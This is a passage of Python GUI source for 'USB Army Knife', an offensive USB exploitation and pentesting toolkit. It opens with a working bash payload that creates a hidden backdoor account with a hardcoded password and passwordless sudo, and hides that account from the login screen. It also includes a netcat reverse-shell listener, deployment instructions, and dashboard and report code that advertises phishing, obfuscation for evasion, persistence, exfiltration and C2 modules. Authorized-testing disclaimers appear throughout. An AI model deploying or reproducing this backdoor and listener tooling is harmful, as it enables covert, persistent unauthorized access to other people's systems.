        """Create backdoor user account"""
        self.postex_console.insert(tk.END, "\n[+] Creating backdoor user...\n")
        
        payload = '''#!/bin/bash
# Backdoor User Creation

USER="sysupdate"
PASS="Backd00r123!"

echo "[+] Creating backdoor user: $USER"

# Create user with sudo privileges
sudo useradd -m -s /bin/bash $USER
echo "$USER:$PASS" | sudo chpasswd

# Add to sudo group
sudo usermod -aG sudo $USER

# Allow passwordless sudo (stealthy)
echo "$USER ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/$USER

# Hide from login screen
sudo mkdir -p /var/lib/AccountsService/users/
cat << EOF | sudo tee /var/lib/AccountsService/users/$USER
[User]
SystemAccount=true
EOF

echo "[+] Backdoor user created"
echo "Username: $USER"
echo "Password: $PASS"
'''
        
        self.postex_payload_text.delete("1.0", tk.END)
        self.postex_payload_text.insert("1.0", payload)
        self.postex_console.insert(tk.END, "[+] Backdoor user script ready\n")
    
    def save_postex_payload(self):
        """Save generated payload"""
        content = self.postex_payload_text.get("1.0", tk.END)
        
        filepath = filedialog.asksaveasfilename(
            defaultextension=".sh",
            filetypes=[("Shell Script", "*.sh"), ("All Files", "*.*")]
        )
        
        if filepath:
            with open(filepath, 'w') as f:
                f.write(content)
            os.chmod(filepath, 0o755)
            self.postex_console.insert(tk.END, f"[+] Payload saved: {filepath}\n")
    
    def copy_postex_payload(self):
        """Copy payload to clipboard"""
        content = self.postex_payload_text.get("1.0", tk.END)
        self.clipboard_clear()
        self.clipboard_append(content)
        self.postex_console.insert(tk.END, "[+] Copied to clipboard\n")
    
    def deploy_postex_payload(self):
        """Deploy payload"""
        messagebox.showinfo("Deploy", "Deploy payload via:\n\n" +
                           "• SCP/SFTP to target\n" +
                           "• Web upload\n" +
                           "• USB Army Knife\n" +
                           "• Existing shell session\n\n" +
                           "Execute with: bash payload.sh")
    
    def start_listener(self):
        """Start reverse shell listener"""
        port = self.postex_callback_port.get()
        
        if self.postex_listener_running:
            messagebox.showwarning("Listener Running", "Listener already active")
            return
        
        if not shutil.which("nc"):
            messagebox.showerror("Netcat Missing", "netcat (nc) is required\nInstall: sudo apt install netcat")
            return
        
        self.postex_console.insert(tk.END, f"\n[+] Starting listener on port {port}...\n")
        
        try:
            self.postex_listener_process = subprocess.Popen(
                ["nc", "-lvnp", port],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            self.postex_listener_running = True
            self.postex_console.insert(tk.END, f"[+] Listener active on 0.0.0.0:{port}\n")
            self.postex_console.insert(tk.END, "[+] Waiting for connections...\n")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to start listener: {e}")
    
    def stop_listener(self):
        """Stop listener"""
        if self.postex_listener_process:
            self.postex_listener_process.terminate()
            self.postex_listener_process = None
            self.postex_listener_running = False
            self.postex_console.insert(tk.END, "[+] Listener stopped\n")
    
    def view_sessions(self):
        """View active sessions"""
        messagebox.showinfo("Sessions", "Active sessions:\n\nNo active sessions\n\nUse multi-handler tools like:\n• Metasploit (msfconsole)\n• Empire\n• Covenant")
    
    def cleanup_persistence(self):
        """Remove all persistence mechanisms"""
        if messagebox.askyesno("Cleanup", "Remove all persistence mechanisms?\n\nThis will:\n• Remove cron jobs\n• Delete backdoor users\n• Clear SSH keys\n• Remove rootkits"):
            self.postex_console.insert(tk.END, "\n[+] Cleaning up persistence mechanisms...\n")
            self.postex_console.insert(tk.END, "[+] Manual cleanup may be required\n")
    
    # Dashboard & Analytics
    def create_dashboard_tab(self):
        """Dashboard with operation overview and analytics"""
        dash_frame = tk.Frame(self.notebook, padding=15)
        self.notebook.add(dash_frame, text="📊 Dashboard")
        
        # Make dashboard the first tab
        self.notebook.insert(0, dash_frame, text="📊 Dashboard")
        
        # Scrollable content area for the dashboard (so bottom buttons are always reachable)
        scroll_container = tk.Frame(dash_frame)
        scroll_container.pack(fill=tk.BOTH, expand=True)
        
        dash_canvas = tkcore.Canvas(scroll_container, highlightthickness=0)
        dash_scrollbar = tk.Scrollbar(scroll_container, orient=tk.VERTICAL, command=dash_canvas.yview)
        dash_inner = tk.Frame(dash_canvas)
        
        dash_inner.bind(
            "<Configure>",
            lambda e: dash_canvas.configure(scrollregion=dash_canvas.bbox("all"))
        )
        inner_id = dash_canvas.create_window((0, 0), window=dash_inner, anchor="nw")
        dash_canvas.configure(yscrollcommand=dash_scrollbar.set)
        
        def _resize_dash(event):
            try:
                dash_canvas.itemconfig(inner_id, width=event.width)
            except Exception:
                pass
        dash_canvas.bind("<Configure>", _resize_dash)
        
        dash_canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        dash_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Smooth scrolling bindings
        def _dash_mousewheel(event):
            try:
                delta = getattr(event, 'delta', 0)
                if delta:
                    steps = int(-delta/120) or (-1 if delta>0 else 1)
                    dash_canvas.yview_scroll(steps, "units")
            except Exception:
                pass
        def _dash_linux_scroll(event):
            try:
                if event.num == 4:
                    dash_canvas.yview_scroll(-3, "units")
                elif event.num == 5:
                    dash_canvas.yview_scroll(3, "units")
            except Exception:
                pass
        for w in (dash_canvas, dash_inner, scroll_container):
            try:
                w.bind("<MouseWheel>", _dash_mousewheel)
                w.bind("<Button-4>", _dash_linux_scroll)
                w.bind("<Button-5>", _dash_linux_scroll)
            except Exception:
                pass
        
        # Build dashboard content inside dash_inner
        header_frame = tk.Frame(dash_inner, style="Card.TFrame", padding=15)
        header_frame.pack(fill=tk.X, pady=(0, 15))
        
        tk.Label(header_frame, text="USB Army Knife - Command Center", 
                font=("Arial", 16, "bold"), foreground="#ff0000").pack()
        tk.Label(header_frame, text="Advanced USB Exploitation & Pentesting Framework", 
                font=("Arial", 10), foreground="#888888").pack(pady=(5, 0))
        
        # Quick stats cards
        stats_frame = tk.Frame(dash_inner)
        stats_frame.pack(fill=tk.X, pady=(0, 15))
        
        stats = [
            ("💾", "Payloads", "0", "Total created"),
            ("🔍", "Scans", "0", "Networks scanned"),
            ("🎯", "Attacks", "0", "Operations run"),
            ("📡", "Devices", "0", "Connected"),
        ]
        
        for i, (icon, title, value, subtitle) in enumerate(stats):
            card = tk.Frame(stats_frame, style="Card.TFrame", padding=15)
            card.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5)
            
            tk.Label(card, text=icon, font=("Arial", 24)).pack()
            tk.Label(card, text=value, font=("Arial", 20, "bold"), foreground="#00ff00").pack()
            tk.Label(card, text=title, font=("Arial", 10, "bold")).pack()
            tk.Label(card, text=subtitle, font=("Arial", 8), foreground="#888888").pack()
        
        # Main content - split into left and right
        main_content = tk.Frame(dash_inner)
        main_content.pack(fill=tk.BOTH, expand=True)
        
        # Left panel - Quick actions
        left_panel = tk.Frame(main_content)
        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 10))
        
        # Quick launch
        quick_frame = tk.LabelFrame(left_panel, text="⚡ Quick Launch", padding=15)
        quick_frame.pack(fill=tk.X, pady=(0, 10))
        
        quick_actions = [
            ("⚡ Flash Device", lambda: self.notebook.select(1)),
            ("📝 Create Payload", lambda: self.notebook.select(4)),
            ("🔍 Scan Network", lambda: self.notebook.select(11)),
            ("🎭 Social Engineering", lambda: self.notebook.select(10)),
            ("🔐 Obfuscate Payload", lambda: self.notebook.select(9)),
            ("🔧 Post-Exploitation", lambda: self.notebook.select(12)),
        ]
        
        for name, cmd in quick_actions:
            btn = tk.Button(quick_frame, text=name, command=cmd, width=25)
            btn.pack(fill=tk.X, pady=3)
        
        # Recent activity
        activity_frame = tk.LabelFrame(left_panel, text="📊 Recent Activity", padding=10)
        activity_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        activity_list_frame = tk.Frame(activity_frame)
        activity_list_frame.pack(fill=tk.BOTH, expand=True)
        
        self.activity_list = Listbox(activity_list_frame, font=("Courier", 8), height=8)
        self.activity_list.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        scrollbar = tk.Scrollbar(activity_list_frame, orient=tk.VERTICAL, command=self.activity_list.yview)
        self.activity_list.configure(yscrollcommand=scrollbar.set)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Add sample activities
        activities = [
            f"{datetime.now().strftime('%H:%M:%S')} - System initialized",
            f"{datetime.now().strftime('%H:%M:%S')} - Dashboard loaded",
            f"{datetime.now().strftime('%H:%M:%S')} - Ready for operations",
        ]
        for activity in activities:
            self.activity_list.insert(tk.END, activity)
        
        # System info
        sysinfo_frame = tk.LabelFrame(left_panel, text="💻 System Information", padding=10)
        sysinfo_frame.pack(fill=tk.X)
        
        import platform
        sysinfo_text = f'''OS: {platform.system()} {platform.release()}
Python: {platform.python_version()}
Architecture: {platform.machine()}
Hostname: {platform.node()}
'''
        
        tk.Label(sysinfo_frame, text=sysinfo_text, font=("Courier", 8), justify=tk.LEFT).pack(anchor=tk.W)
        
        # Right panel - Status and tools
        right_panel = tk.Frame(main_content)
        right_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        # Device status
        device_frame = tk.LabelFrame(right_panel, text="📱 Connected Devices", padding=10)
        device_frame.pack(fill=tk.X, pady=(0, 10))
        
        tk.Button(device_frame, text="🔄 Refresh Devices", command=self.refresh_dashboard_devices).pack(fill=tk.X, pady=5)
        
        self.device_status_text = tk.Text(device_frame, height=4, font=("Courier", 8), bg="#1a1a1a", fg="#00ff00")
        self.device_status_text.pack(fill=tk.X)
        self.device_status_text.insert("1.0", "No devices connected\nConnect a USB Army Knife device...")
        
        # Feature map
        features_frame = tk.LabelFrame(right_panel, text="🗺️ Feature Map", padding=10)
        features_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        features_text = '''🏰 ATTACK SURFACE:
  • WiFi Attacks (802.11 exploitation)
  • Bluetooth HID Injection
  • Network Reconnaissance
  • Social Engineering
  
🔧 TOOLKITS:
  • Payload Generation (DuckyScript)
  • Obfuscation & Encoding
  • Post-Exploitation
  • C2 Server Integration
  
🛡️ DEFENSIVE:
  • eFuse Management
  • Serial Monitoring
  • Configuration Profiles
'''
        
        tk.Label(features_frame, text=features_text, font=("Courier", 8), 
                justify=tk.LEFT, foreground="#00ff00").pack(anchor=tk.W)
        
        # Recommendations
        rec_frame = tk.LabelFrame(right_panel, text="💡 Recommendations", padding=10)
        rec_frame.pack(fill=tk.X)
        
        recommendations = [
            "• Start with device flashing (Flasher tab)",
            "• Create payload profiles for quick deployment",
            "• Test payloads in Serial Monitor before deployment",
            "• Use obfuscation for evasion",
            "• Always authorized testing only!",
        ]
        
        for rec in recommendations:
            tk.Label(rec_frame, text=rec, font=("Arial", 8), foreground="#888888").pack(anchor=tk.W, pady=2)
        
        # Bottom action bar (inside scrollable area to remain reachable via scroll)
        action_bar = tk.Frame(dash_inner)
        action_bar.pack(fill=tk.X, pady=(15, 0))
        
        tk.Button(action_bar, text="💾 Export Report", command=self.export_dashboard_report).pack(side=tk.LEFT, padx=5)
        tk.Button(action_bar, text="🛠️ Settings", command=self.open_global_settings).pack(side=tk.LEFT, padx=5)
        tk.Button(action_bar, text="📚 Documentation", command=self.open_documentation).pack(side=tk.LEFT, padx=5)
        tk.Button(action_bar, text="❓ About", command=self.show_about).pack(side=tk.LEFT, padx=5)
        
        # Status bar at bottom
        status_bar = tk.Frame(dash_frame, relief=tk.SUNKEN, borderwidth=1)
        status_bar.pack(fill=tk.X, side=tk.BOTTOM)
        
        self.status_label = tk.Label(status_bar, text="Ready", anchor=tk.W, font=("Arial", 8))
        self.status_label.pack(side=tk.LEFT, padx=5)
        
        time_label = tk.Label(status_bar, text=datetime.now().strftime("%Y-%m-%d %H:%M:%S"), 
                             anchor=tk.E, font=("Arial", 8))
        time_label.pack(side=tk.RIGHT, padx=5)
        
        # Update time every second
        def update_time():
            time_label.config(text=datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
            self.after(1000, update_time)
        
        update_time()
    
    def refresh_dashboard_devices(self):
        """Refresh connected devices in dashboard"""
        try:
            ports = serial.tools.list_ports.comports()
            
            self.device_status_text.delete("1.0", tk.END)
            
            if ports:
                for i, port in enumerate(ports, 1):
                    self.device_status_text.insert(tk.END, f"{i}. {port.device} - {port.description}\n")
            else:
                self.device_status_text.insert(tk.END, "No devices connected")
            
            # Update activity
            self.activity_list.insert(tk.END, f"{datetime.now().strftime('%H:%M:%S')} - Device scan: {len(ports)} found")
            self.activity_list.see(tk.END)
            
        except Exception as e:
            self.device_status_text.delete("1.0", tk.END)
            self.device_status_text.insert("1.0", f"Error: {e}")
    
    def export_dashboard_report(self):
        """Export comprehensive operation report"""
        filepath = filedialog.asksaveasfilename(
            defaultextension=".html",
            filetypes=[("HTML Report", "*.html"), ("Text Report", "*.txt")]
        )
        
        if not filepath:
            return
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        if filepath.endswith('.html'):
            report = f'''<!DOCTYPE html>
<html>
<head>
    <title>USB Army Knife - Operation Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }}
        h1 {{ color: #ff0000; }}
        .section {{ background: white; padding: 20px; margin: 20px 0; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }}
        .stat {{ display: inline-block; margin: 10px 20px; }}
        .stat-value {{ font-size: 24px; font-weight: bold; color: #00ff00; }}
        .stat-label {{ color: #666; }}
        table {{ width: 100%; border-collapse: collapse; }}
        th, td {{ padding: 10px; text-align: left; border-bottom: 1px solid #ddd; }}
        th {{ background: #333; color: white; }}
    </style>
</head>
<body>
    <h1>🗡️ USB Army Knife - Operation Report</h1>
    
    <div class="section">
        <h2>Report Summary</h2>
        <p><strong>Generated:</strong> {timestamp}</p>
        <p><strong>System:</strong> {os.uname().sysname} {os.uname().release}</p>
        <p><strong>Framework Version:</strong> 1.0.0</p>
    </div>
    
    <div class="section">
        <h2>Operation Statistics</h2>
        <div class="stat">
            <div class="stat-value">0</div>
            <div class="stat-label">Payloads Created</div>
        </div>
        <div class="stat">
            <div class="stat-value">0</div>
            <div class="stat-label">Networks Scanned</div>
        </div>
        <div class="stat">
            <div class="stat-value">0</div>
            <div class="stat-label">Attacks Executed</div>
        </div>
    </div>
    
    <div class="section">
        <h2>Available Modules</h2>
        <table>
            <tr><th>Module</th><th>Description</th><th>Status</th></tr>
            <tr><td>Flasher</td><td>Device firmware management</td><td>✅ Ready</td></tr>
            <tr><td>DuckyScript</td><td>Payload generation</td><td>✅ Ready</td></tr>
            <tr><td>WiFi Attacks</td><td>Wireless exploitation</td><td>✅ Ready</td></tr>
            <tr><td>Bluetooth</td><td>BT HID injection</td><td>✅ Ready</td></tr>
            <tr><td>Network Recon</td><td>Port scanning</td><td>✅ Ready</td></tr>
            <tr><td>Social Engineering</td><td>Phishing toolkit</td><td>✅ Ready</td></tr>
            <tr><td>Obfuscation</td><td>Payload encoding</td><td>✅ Ready</td></tr>
            <tr><td>Post-Exploitation</td><td>Persistence & exfil</td><td>✅ Ready</td></tr>
        </table>
    </div>
    
    <div class="section">
        <h2>Activity Log</h2>
        <pre>{self.activity_list.get(0, tk.END) if hasattr(self, 'activity_list') else 'No activity recorded'}</pre>
    </div>
    
    <div class="section">
        <p style="text-align: center; color: #ff0000; font-weight: bold;">
            ⚠️ FOR AUTHORIZED SECURITY TESTING ONLY ⚠️
        </p>
    </div>
</body>
</html>'''
        else:
            report = f'''USB ARMY KNIFE - OPERATION REPORT
{'='*50}

Generated: {timestamp}
System: {os.uname().sysname} {os.uname().release}

OPERATION STATISTICS:
  - Payloads Created: 0
  - Networks Scanned: 0
  - Attacks Executed: 0

AVAILABLE MODULES:
  ✓ Flasher
  ✓ DuckyScript
  ✓ WiFi Attacks
  ✓ Bluetooth
  ✓ Network Recon
  ✓ Social Engineering
  ✓ Obfuscation
  ✓ Post-Exploitation

⚠️ FOR AUTHORIZED SECURITY TESTING ONLY ⚠️
'''
        
        with open(filepath, 'w') as f:
            f.write(report)
        
        messagebox.showinfo("Report Exported", f"Report saved to {filepath}")
        
        if filepath.endswith('.html') and messagebox.askyesno("Open Report", "Open report in browser?"):
            webbrowser.open(f'file://{os.path.abspath(filepath)}')
    
    def open_global_settings(self):
        """Open global settings dialog"""
        settings_win = tk.Toplevel(self)
        settings_win.title("Global Settings")
        settings_win.geometry("500x400")
        
        tk.Label(settings_win, text="Global Settings", font=("Arial", 14, "bold")).pack(pady=10)
        
        settings_frame = tk.LabelFrame(settings_win, text="Preferences", padding=15)
        settings_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Theme
        tk.Label(settings_frame, text="Theme:").grid(row=0, column=0, sticky=tk.W, pady=5)
        theme_combo = tk.Combobox(settings_frame, state="readonly", values=["Cyborg (Dark)", "Darkly", "Solar"])
        theme_combo.current(0)
        theme_combo.grid(row=0, column=1, sticky=tk.EW, pady=5, padx=5)
        
        # Auto-save
        tk.Checkbutton(settings_frame, text="Auto-save payloads").grid(row=1, column=0, columnspan=2, sticky=tk.W, pady=5)
        tk.Checkbutton(settings_frame, text="Show confirmation dialogs").grid(row=2, column=0, columnspan=2, sticky=tk.W, pady=5)
        tk.Checkbutton(settings_frame, text="Enable logging").grid(row=3, column=0, columnspan=2, sticky=tk.W, pady=5)
        
        # Default paths
        tk.Label(settings_frame, text="Payload Directory:").grid(row=4, column=0, sticky=tk.W, pady=5)
        payload_dir = tk.Entry(settings_frame)
        payload_dir.insert(0, "./payloads")
        payload_dir.grid(row=4, column=1, sticky=tk.EW, pady=5, padx=5)
        
        settings_frame.columnconfigure(1, weight=1)
        
        tk.Button(settings_win, text="Save", command=settings_win.destroy).pack(pady=10)
    
    def open_documentation(self):
        """Open documentation"""
        messagebox.showinfo("Documentation", 
                           "USB Army Knife Documentation\n\n" +
                           "Online: https://github.com/usb-army-knife\n" +
                           "Wiki: https://github.com/usb-army-knife/wiki\n\n" +
                           "Quick Start:\n" +
                           "1. Flash device firmware\n" +
                           "2. Create DuckyScript payload\n" +
                           "3. Deploy and execute\n\n" +
                           "For support: Open an issue on GitHub")
    
    def show_about(self):
        """Show about dialog"""
        about_win = tk.Toplevel(self)
        about_win.title("About USB Army Knife")
        about_win.geometry("400x350")
        
        tk.Label(about_win, text="🗡️ USB Army Knife", font=("Arial", 16, "bold")).pack(pady=20)
        tk.Label(about_win, text="Advanced USB Exploitation Framework", font=("Arial", 10)).pack()
        tk.Label(about_win, text="Version 1.0.0", font=("Arial", 9), foreground="#888888").pack(pady=5)
        
        info_frame = tk.Frame(about_win, padding=20)
        info_frame.pack(fill=tk.BOTH, expand=True)
        
        info_text = '''Features:
• ESP32 Firmware Flashing
• DuckyScript Payload Generation
• WiFi Attack Suite
• Bluetooth HID Injection
• Network Reconnaissance
• Social Engineering Toolkit
• Payload Obfuscation
• Post-Exploitation Tools
• C2 Server Integration

Built with Python + ttkbootstrap

⚠️ For Authorized Testing Only
'''
        
        tk.Label(info_frame, text=info_text, font=("Arial", 9), justify=tk.LEFT).pack()
        
        tk.Button(about_win, text="Close", command=about_win.destroy).pack(pady=10)


if __name__ == "__main__":
    app = USBArmyKnifeInstaller()
    app.mainloop()
